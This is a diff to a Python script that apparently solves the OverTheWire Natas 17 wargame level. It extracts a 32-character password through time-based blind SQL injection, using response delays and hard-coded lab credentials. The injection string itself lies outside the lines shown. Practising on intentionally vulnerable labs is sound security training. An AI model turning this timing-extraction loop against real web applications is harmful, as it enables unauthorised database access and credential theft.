@@ -1,19 +1,17 @@
-import requests, pprint
+import requests, string
 from bs4 import BeautifulSoup
  
 #Time-Based Blind SQLi 
 
 user = "natas17"
-password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
+password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
 url = f"http://{user}.natas.labs.overthewire.org"
 
 session = requests.Session()
 session.auth = (user, password)
 auth = session.post(url)
-print(auth.text)
-exit()
 
-possibleCharacters = list(map(chr, range(97, 123))) + list(map(chr, range(65, 91))) + list(map(chr, range(48, 58)))
+possibleCharacters = list(string.ascii_letters + string.digits) #possible flag characters are letters and digits.
 resultFlag = ""
 
 characterCounter = 0
@@ -25,7 +23,7 @@ while(len(resultFlag) < 32):
     print("Testing: " + challenge)
     resp = session.post(url, data=challenge_params)
     
-    print(BeautifulSoup(resp.text, 'html.parser').prettify())
+    #print(BeautifulSoup(resp.text, 'html.parser').prettify())
     if(resp.elapsed.total_seconds() >= 2):
         print("Match!")
         resultFlag += possibleCharacters[characterCounter]
@@ -33,8 +31,6 @@ while(len(resultFlag) < 32):
         continue
     else:
         characterCounter += 1
-
-
 
 #print(BeautifulSoup(resp.text, 'html.parser').prettify())
 print("Flag: " + resultFlag)
